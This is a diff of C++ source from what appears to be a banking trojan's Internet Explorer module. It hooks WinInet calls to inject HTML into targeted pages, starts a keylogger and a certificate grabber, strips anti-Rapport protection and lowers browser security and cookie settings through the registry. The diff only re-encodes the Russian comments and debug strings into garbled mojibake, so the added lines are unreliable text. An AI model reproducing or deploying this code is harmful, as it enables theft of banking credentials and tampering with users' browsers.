+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	pCloseHandle(Request->Event);
 
-	// Возвращаем метод обратной связи
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	RestoreCallbackMethod(Request);
 
-	IEDBG(Request, Request->Buffer, "Документ загружен");
+	IEDBG(Request, Request->Buffer, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 
-	// Устанавливаем признак загруженной страницы
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	Request->FileReaded = true;
 
-	// Вызываем старый метод обратной связи
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (Request->Entry > 0 && Request->Entry != MAXDWORD)
 	{
 		INTERNET_ASYNC_RESULT iar;
@@ -859,24 +870,24 @@ int InjectReadFile(PRequest Request, LPVOID lpBuffer,
 	DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead,
 	DWORD_PTR dwContext)
 {
-	// Функция загрузки файла
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (!Request) return 1;
 
 	int r = 1;
 
 	*lpdwNumberOfBytesRead = 0;
 
-	// Если страница ещё не загружена то запускаем её загрузку
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!Request->FileReaded)
 	{
 		if (lpBuffer == NULL)
 			Request->Entry = MAXDWORD;
 
-		// запускаем скачку файла
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		r = ReadDataProc(Request);
 	}
 
-	// Если страница загружена то выдаём данные порциями, по мере запроса
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Request->FileReaded && r && Request->Injected)
 	{
 		*lpdwNumberOfBytesRead = Request::GetNextDataPart(Request, lpBuffer,
@@ -889,26 +900,26 @@ int InjectReadFile(PRequest Request, LPVOID lpBuffer,
 
 void HandleFirstRead(PRequest Request)
 {
-	// проверяем параметры BASIC авторизации
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ BASIC пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	CheckBASICAuthorization(Request);
 
 	if (!Request->IsInject)
 		return;
 
-	IEDBG(Request, NULL, "Обрабатываем ответ сервера:");
-	// Проверяем статус ответа
+	IEDBG(Request, NULL, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ:");
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD Status = 0;
 	DWORD Size = sizeof(Status);
 	pHttpQueryInfoA((HINTERNET)Request->Owner,
 		HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &Status, &Size, NULL);
 
-	IEDBG(Request, NULL, "Код ответа: %d", Status);
+	IEDBG(Request, NULL, "пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ: %d", Status);
 	if (Status != HTTP_STATUS_OK) {
 		Request->IsInject = false;
 		return;
 	}
 
-	// Проверяем тип контента
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 #ifdef HTMLInjectsH
 	PCHAR ContentType = GetHTTPInfo((HINTERNET)Request->Owner,
 		HTTP_QUERY_CONTENT_TYPE);
@@ -920,7 +931,7 @@ void HandleFirstRead(PRequest Request)
 	else
 	{
 		Request->IsInject = false;
-		IEDBG(Request, NULL, "Контент %s не поддерживается!", ContentType);
+		IEDBG(Request, NULL, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ %s пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ!", ContentType);
 	}
 
 	STR::Free(ContentType);
@@ -932,59 +943,59 @@ BOOL __stdcall InternetHandler(BYTE bType, HINTERNET hFile, LPVOID lpBuffer,
 	DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead, DWORD dwFlags,
 	DWORD_PTR dwContext)
 {
-	// Функция обработки методов для работы с методами чтения данных
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	int r = 0;
 
 	PRequest pRequest = Request::Find(Requests, hFile);
 
 	if (pRequest)
 	{
-		// При первой попытке чтения проверяем дополнительные данные
+		// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if (!pRequest->FirstHandled)
 		{
 			pRequest->FirstHandled = true;
 
-			// DbgMsg("InternetExplorer", 0, "Адрес(%d) %s", (DWORD)pRequest->IsInject, pRequest->URL);
+			// DbgMsg("InternetExplorer", 0, "пїЅпїЅпїЅпїЅпїЅ(%d) %s", (DWORD)pRequest->IsInject, pRequest->URL);
 			HandleFirstRead(pRequest);
 
 			if (pRequest->IsInject)
 				pRequest->AllowClose = pCreateEventW(NULL, TRUE, TRUE, NULL);
 		}
 
-		// Если идёт запрос к адресу по маске, то используем свои
-		// методы чтения
+		// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if (pRequest->IsInject)
 		{
-			// На время исполнения методом заблокируем попытку удаления запроса
+			// пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			pResetEvent(pRequest->AllowClose);
 
 			if (bType == 0)
 			{
-				// Перекрытие метода WinInet InternetReadFile
+				// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ WinInet InternetReadFile
 				r = InjectReadFile(pRequest, lpBuffer, dwNumberOfBytesToRead,
 					lpdwNumberOfBytesRead, dwContext);
 			}
 			else if (bType == 1 || bType == 2)
 			{
-				// Перекрытие метода WinInet InternetReadFileExA, InternetReadFileExA
+				// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ WinInet InternetReadFileExA, InternetReadFileExA
 				LPINTERNET_BUFFERSA pib = (LPINTERNET_BUFFERSA)lpBuffer;
 				r = InjectReadFile
 					(pRequest, pib->lpvBuffer, pib->dwBufferLength, &pib->dwBufferLength, dwContext);
 			}
 			else if (bType == 3) {
-				// Запрашивается длина доступных данных
+				// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 				r = InjectReadFile(pRequest, NULL, 0, lpdwNumberOfBytesRead,
 					dwContext);
 			}
 
-			// Разрешаем удаление запроса
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			pSetEvent(pRequest->AllowClose);
 
 			return r;
 		}
 	}
 
-	// Вызываем стандартные методы работы с интернетом
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (bType == 0)
 		r = REAL_InternetReadFile(hFile, lpBuffer, dwNumberOfBytesToRead,
 			lpdwNumberOfBytesRead);
@@ -1074,8 +1085,8 @@ BOOL __stdcall HOOK_InternetQueryDataAvailable(HINTERNET hFile,
 
 BOOL WINAPI HOOK_InternetCloseHandle(HINTERNET hInternet)
 {
-	// Браузер закрывает дескриптор
-	// Удаляем струру запроса
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PRequest R = Request::Find(Requests, hInternet);
 	if (R)
 	{
@@ -1088,7 +1099,7 @@ BOOL WINAPI HOOK_InternetCloseHandle(HINTERNET hInternet)
 		PRequest R = Request::Find(Requests, hInternet);
 		if (R)
 		{
-			IEDBG(R, NULL, "Соединение закрыто");
+			IEDBG(R, NULL, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 			Request::Delete(Requests, hInternet);
 		}
 	}
@@ -1100,19 +1111,19 @@ BOOL WINAPI HOOK_InternetCloseHandle(HINTERNET hInternet)
 
 void ProcessInternetConnection(HINTERNET Handle, LPBYTE InetServer, bool IsSecure, bool IsUnicode)
 {
-	// Обрабатываем подключение к серверу
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Handle == NULL || InetServer == NULL)
 		return;
 
-	// Добавляем запись в список запросов
-	// В случае если не удалось добавить либо данный идентификатор уже есть
-	// в списке прерываем обработку
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+	// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	bool Existed = false;
 	PRequest R = Request::Add(Requests, Handle, &Existed);
 	if (R == NULL || Existed)
 		return;
 
-	// Собираем адрес запроса
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	PCHAR Server = (IsUnicode)? (WSTR::ToAnsi((PWCHAR)InetServer, 0)) :
 								((PCHAR)InetServer);
@@ -1132,7 +1143,7 @@ HINTERNET WINAPI HOOK_InternetConnectA(HINTERNET hInternet,
 	LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService,
 	DWORD dwFlags, DWORD_PTR dwContext)
 {
-	// Создаём подключение
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	HINTERNET Handle = REAL_InternetConnectA(hInternet, lpszServerName,
 							nServerPort, lpszUserName, lpszPassword, dwService,
 							dwFlags, dwContext);
@@ -1150,7 +1161,7 @@ HINTERNET WINAPI HOOK_InternetConnectW(HINTERNET hInternet,
 	LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService,
 	DWORD dwFlags, DWORD_PTR dwContext)
 {
-	// Создаём подключение
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	HINTERNET Handle = REAL_InternetConnectW(hInternet, lpszServerName,
 					 	nServerPort, lpszUserName, lpszPassword, dwService,
 						dwFlags, dwContext);
@@ -1167,7 +1178,7 @@ HINTERNET WINAPI HOOK_InternetConnectW(HINTERNET hInternet,
 #ifdef HTMLInjectsH
 	void ProcessRequest(HINTERNET Connect, LPCSTR Verb, LPCSTR Object, DWORD &Flags)
 	{
-		// Функция обрабатывает запрос
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		PRequest R = Request::Find(Requests, Connect);
 		if (R == NULL) return;
 
@@ -1176,10 +1187,10 @@ HINTERNET WINAPI HOOK_InternetConnectW(HINTERNET hInternet,
 
 		THTTPMethod Method = GetMethodFromStr((PCHAR)Verb);
 
-		// Проыеряем из инжектов ли страница
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if (Config::IsInjectURL(URL, Method))
 		{
-			// В случае если страница из инжектов, то меняем флаги загрузки
+			// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 			Flags = Flags & (~INTERNET_FLAG_HYPERLINK);
 
@@ -1278,7 +1289,7 @@ BOOL WINAPI HOOK_HttpQueryInfoW(HINTERNET hRequest, DWORD dwInfoLevel,
 #ifdef UniversalKeyLoggerH
 	BOOL WINAPI HOOK_InternetWriteFile(HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite, LPDWORD lpdwNumberOfBytesWritten )
 	{
-		// Вызываем событие кейлогера
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		THTTPRequestData Data;
 		ClearStruct(Data);
 
@@ -1300,13 +1311,13 @@ BOOL WINAPI HOOK_HttpQueryInfoW(HINTERNET hRequest, DWORD dwInfoLevel,
 
 bool WINAPI IsInternetExplorer()
 {
-	// Функция вернёт истину если она вызвана в процессе
-	// интернет експлорера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	DWORD Hash = File::GetNameHashA(Bot->ApplicationName(), true);
 
 	bool IsIE = Hash == 0x250DFA8F /* iexplore.exe */ ||
-				Hash == 0x1D30C46B /* хер его знает */;
+				Hash == 0x1D30C46B /* пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ */;
 
 	return IsIE;
 }
@@ -1314,7 +1325,7 @@ bool WINAPI IsInternetExplorer()
 
 void IEClearCache()
 {
-	// Функция очищает кэш интернет експлорера.
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	BOOL bResult = FALSE;
 	BOOL bDone = FALSE;
 
@@ -1360,7 +1371,7 @@ void IEClearCache()
 			}
 			else {
 				dwError = (DWORD)pGetLastError();
-				dwEntrySize = dwTrySize; // возвращаем новый размер буфера
+				dwEntrySize = dwTrySize; // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			}
 
 			break;
@@ -1410,8 +1421,8 @@ void IEClearCache()
 // ----------------------------------------------------------------------------
 
 // *********************************************************************
-// UpdateIERegistry - Правит настройки реестра, для отключения
-// некторых свойств безопасности
+// UpdateIERegistry - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 // *********************************************************************
 
 void UpdateIERegistry()
@@ -1425,19 +1436,19 @@ void UpdateIERegistry()
 	const static char* ParamMaxScriptStatements = "MaxScriptStatements";
 
 
-	// Убиваем ограничение на максимальное время выполнения ява скриптов
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	string Path = IEPath + RegPathMaxScriptStatements;
 	Registry::CreateKey(HKEY_CURRENT_USER, IEPath.t_str(), (PCHAR)RegPathMaxScriptStatements);
 	Registry::SetValueDWORD(HKEY_CURRENT_USER, Path.t_str(), (PCHAR)ParamMaxScriptStatements, 0xFFFFFFFF);
 
 
-	// Отключаем очистку куков по выходу из ИЕ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ
 	Path = IEPath + RegPathPrivacy;
 	Registry::SetValueDWORD(HKEY_CURRENT_USER, Path.t_str(), (PCHAR)ParamCleanCookies, 0);
 
 
 
-	// Отключаем настройки безопасности
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR RegPathZone =
 		"Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\";
 
@@ -1466,31 +1477,31 @@ void UpdateIERegistry()
 
 bool HookInternetExplorer()
 {
-	// функция вешает хуки на базовые функции которые использует
-	// Internet Explorer для загрузки документов
-	// Работает только в случае вызова из процесса интернет експлорера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// Internet Explorer пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!IsInternetExplorer())
 		return false;
 
-	IEDBG("Инициализация InternetExplorer:");
+	IEDBG("пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ InternetExplorer:");
 
 #ifdef HTMLInjectsH
-	IEDBG("Инициализируем HTML инжекты");
+	IEDBG("пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTML пїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 	Config::Initialize();
 #endif
 
 	if (!HookInternetExplorerApi())
 		return false;
 
-	// Инициализируем охотника за ссылками
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 #ifdef HunterH
-	IEDBG("Инициализируем модуль хантера");
+	IEDBG("пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 	URLHunter::Initialize();
 #endif
 
-	// Запускаем грабер сертификатов
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 #ifdef CertGrabH
-	IEDBG("Инициализируем грабер сертификатов");
+	IEDBG("пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 	CertGrabber::Initialize();
 #endif
 
@@ -1498,7 +1509,7 @@ bool HookInternetExplorer()
 	SetJavaPatcherHook();
 #endif
 
-	IEDBG("Интернет эксплорер проинициализирован");
+	IEDBG("пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 	return true;
 }
 // ----------------------------------------------------------------------------
@@ -1506,22 +1517,22 @@ bool HookInternetExplorer()
 
 bool HookInternetExplorerApi()
 {
-	// HookInternetExplorerApi - функция вешает хуки на интернет API
-	// которые использует интернет експлорер для загрузки страниц
+	// HookInternetExplorerApi - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ API
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 
-	IEDBG("Перехват функций WinAPI");
+	IEDBG("пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ WinAPI");
 
 	#ifdef antirapportH
-		AntiRapport(); // снимаем хуки антирапорта
+		AntiRapport(); // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	#endif
 
 	//UnhookIE();
 
-	IEDBG("Инициализируем глобальные данные");
+	IEDBG("пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ");
 	InitIEGlobalData();
 
-	IEDBG("Меняем настройки реестра");
+	IEDBG("пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 	UpdateIERegistry();
 
 	DWORD dwHash_HttpSendRequestA = 0x9F13856A;
@@ -1548,7 +1559,7 @@ bool HookInternetExplorerApi()
 	#define Hash_InternetConnectW 0xBE618D28 /* InternetConnectW */
 	#define Hash_InternetWriteFile 0x205BD56A /* InternetWriteFile */
 
-	IEDBG("Ставим хуки");
+	IEDBG("пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ");
 
 	if (HookApi(DLL_WININET, Hash_InternetConnectA, &HOOK_InternetConnectA))
 	{
@@ -1642,8 +1653,8 @@ bool HookInternetExplorerApi()
 	}
 
 
-	// Перехват функции делаем только при включенном кейлогере и отключенном
-	// модуле BSS
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅ BSS
 	#if defined(UniversalKeyLoggerH) && !defined(BSSH)
 	if ( HookApi( DLL_WININET, Hash_InternetWriteFile, &HOOK_InternetWriteFile ) )
 	{
